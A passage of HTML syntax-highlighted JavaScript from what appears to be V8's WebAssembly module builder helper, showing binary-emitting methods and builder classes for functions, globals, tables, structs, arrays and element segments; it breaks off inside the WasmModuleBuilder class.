punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// This is the hacky way to convert a JavaScript string to a UTF8 encoded</span>          <span class="token comment">// string only containing single-byte characters.</span>          <span class="token keyword">let</span> string_utf8 <span class="token operator">=</span> <span class="token function">unescape</span><span class="token punctuation">(</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>string_utf8<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> string_utf8<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>string_utf8<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">emit_heap_type</span><span class="token punctuation">(</span><span class="token parameter">heap_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span><span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span>heap_type<span class="token punctuation">,</span> kMaxVarInt32Size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">emit_type</span><span class="token punctuation">(</span><span class="token parameter">type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> type <span class="token operator">==</span> <span class="token string">"number"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>type <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">?</span> type <span class="token operator">:</span> type <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>opcode<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"depth"</span> <span class="token keyword">in</span> type<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>depth<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_heap_type</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>heap_type<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">emit_init_expr</span><span class="token punctuation">(</span><span class="token parameter">expr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kExprEnd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">emit_header</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>            kWasmH0<span class="token punctuation">,</span>            kWasmH1<span class="token punctuation">,</span>            kWasmH2<span class="token punctuation">,</span>            kWasmH3<span class="token punctuation">,</span>            kWasmV0<span class="token punctuation">,</span>            kWasmV1<span class="token punctuation">,</span>            kWasmV2<span class="token punctuation">,</span>            kWasmV3<span class="token punctuation">,</span>          <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">emit_section</span><span class="token punctuation">(</span><span class="token parameter">section_code<span class="token punctuation">,</span> content_generator</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token comment">// Emit section name.</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>section_code<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// Emit the section to a temporary buffer: its full length isn't know yet.</span>          <span class="token keyword">const</span> section <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Binary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">content_generator</span><span class="token punctuation">(</span>section<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// Emit section length.</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>section<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// Copy the temporary buffer.</span>          <span class="token comment">// Avoid spread because &#123;section&#125; can be huge.</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>section<span class="token punctuation">.</span><span class="token function">trunc_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">class</span> <span class="token class-name">WasmFunctionBuilder</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Encoding of local names: a string corresponds to a local name,</span>        <span class="token comment">// a number n corresponds to n undefined names.</span>        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> name<span class="token punctuation">,</span> type_index<span class="token punctuation">,</span> arg_names</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>module <span class="token operator">=</span> module<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>type_index <span class="token operator">=</span> type_index<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>locals <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>local_names <span class="token operator">=</span> arg_names<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>body_offset <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span> <span class="token comment">// Not valid until module is serialized.</span>        <span class="token punctuation">&#125;</span>        <span class="token function">numLocalNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> num_local_names <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> loc_name <span class="token keyword">of</span> <span class="token keyword">this</span><span class="token punctuation">.</span>local_names<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> loc_name <span class="token operator">==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token operator">++</span>num_local_names<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">return</span> num_local_names<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">exportAs</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>module<span class="token punctuation">.</span><span class="token function">addExport</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">exportAs</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">setCompilationHint</span><span class="token punctuation">(</span><span class="token parameter">strategy<span class="token punctuation">,</span> baselineTier<span class="token punctuation">,</span> topTier</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>module<span class="token punctuation">.</span><span class="token function">setCompilationHint</span><span class="token punctuation">(</span>            strategy<span class="token punctuation">,</span>            baselineTier<span class="token punctuation">,</span>            topTier<span class="token punctuation">,</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>index          <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addBody</span><span class="token punctuation">(</span><span class="token parameter">body</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">checkExpr</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// Store a copy of the body, and automatically add the end opcode.</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>body <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span>kExprEnd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addBodyWithEnd</span><span class="token punctuation">(</span><span class="token parameter">body</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>body <span class="token operator">=</span> body<span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">getNumLocals</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> total_locals <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> l <span class="token keyword">of</span> <span class="token keyword">this</span><span class="token punctuation">.</span>locals<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            total_locals <span class="token operator">+=</span> l<span class="token punctuation">.</span>count<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">return</span> total_locals<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addLocals</span><span class="token punctuation">(</span><span class="token parameter">type<span class="token punctuation">,</span> count<span class="token punctuation">,</span> names</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>locals<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> type<span class="token punctuation">,</span> <span class="token literal-property property">count</span><span class="token operator">:</span> count <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          names <span class="token operator">=</span> names <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>names<span class="token punctuation">.</span>length <span class="token operator">></span> count<span class="token punctuation">)</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"too many locals names given"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>local_names<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">...</span>names<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> names<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>local_names<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>count <span class="token operator">-</span> names<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>module<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">class</span> <span class="token class-name">WasmGlobalBuilder</span> <span class="token punctuation">&#123;</span>        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> type<span class="token punctuation">,</span> mutable<span class="token punctuation">,</span> init</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>module <span class="token operator">=</span> module<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>mutable <span class="token operator">=</span> mutable<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>init <span class="token operator">=</span> init<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">exportAs</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalGlobal<span class="token punctuation">,</span>            <span class="token literal-property property">index</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>index<span class="token punctuation">,</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">checkExpr</span><span class="token punctuation">(</span><span class="token parameter">expr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> b <span class="token keyword">of</span> expr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> b <span class="token operator">!==</span> <span class="token string">"number"</span> <span class="token operator">||</span> <span class="token punctuation">(</span>b <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>              <span class="token string">"invalid body (entries must be 8 bit numbers): "</span> <span class="token operator">+</span> expr            <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">class</span> <span class="token class-name">WasmTableBuilder</span> <span class="token punctuation">&#123;</span>        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> type<span class="token punctuation">,</span> initial_size<span class="token punctuation">,</span> max_size<span class="token punctuation">,</span> init_expr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token comment">// TODO(manoskouk): Add the table index.</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>module <span class="token operator">=</span> module<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>initial_size <span class="token operator">=</span> initial_size<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>has_max <span class="token operator">=</span> max_size <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>max_size <span class="token operator">=</span> max_size<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>init_expr <span class="token operator">=</span> init_expr<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>has_init <span class="token operator">=</span> init_expr <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">exportAs</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalTable<span class="token punctuation">,</span>            <span class="token literal-property property">index</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>index<span class="token punctuation">,</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">makeField</span><span class="token punctuation">(</span><span class="token parameter">type<span class="token punctuation">,</span> mutability</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> mutability <span class="token operator">!=</span> <span class="token string">"boolean"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"field mutability must be boolean"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> type<span class="token punctuation">,</span> <span class="token literal-property property">mutability</span><span class="token operator">:</span> mutability <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">class</span> <span class="token class-name">WasmStruct</span> <span class="token punctuation">&#123;</span>        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">fields<span class="token punctuation">,</span> is_final<span class="token punctuation">,</span> supertype_idx</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>fields<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"struct fields must be an array"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>fields <span class="token operator">=</span> fields<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>type_form <span class="token operator">=</span> kWasmStructTypeForm<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>is_final <span class="token operator">=</span> is_final<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>supertype <span class="token operator">=</span> supertype_idx<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">class</span> <span class="token class-name">WasmArray</span> <span class="token punctuation">&#123;</span>        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">type<span class="token punctuation">,</span> mutability<span class="token punctuation">,</span> is_final<span class="token punctuation">,</span> supertype_idx</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>mutability <span class="token operator">=</span> mutability<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>type_form <span class="token operator">=</span> kWasmArrayTypeForm<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>is_final <span class="token operator">=</span> is_final<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>supertype <span class="token operator">=</span> supertype_idx<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">class</span> <span class="token class-name">WasmElemSegment</span> <span class="token punctuation">&#123;</span>        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">table<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> type<span class="token punctuation">,</span> elements<span class="token punctuation">,</span> is_decl</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>table <span class="token operator">=</span> table<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>offset <span class="token operator">=</span> offset<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>elements <span class="token operator">=</span> elements<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>is_decl <span class="token operator">=</span> is_decl<span class="token punctuation">;</span>          <span class="token comment">// Invariant checks.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>table <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>offset <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"invalid element segment"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> elem <span class="token keyword">of</span> elements<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> elem <span class="token operator">==</span> <span class="token string">"number"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>type <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"invalid element"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">is_active</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>table <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">is_passive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>table <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>is_decl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">is_declarative</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>table <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>is_decl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">expressions_as_elements</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">class</span> <span class="token class-name">WasmModuleBuilder</span> <span class="token punctuation">&#123;</span>        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>types <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>imports <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>stringrefs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>globals <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>tables <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>tags <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>memories <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>functions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>compilation_hints <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>element_segments <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>data_segments <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>explicit <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>rec_groups <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_funcs <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_globals <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_tables <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_tags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addStart</span><span class="token punctuation">(</span><span class="token parameter">start_index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>start_index <span class="token operator">=</span> 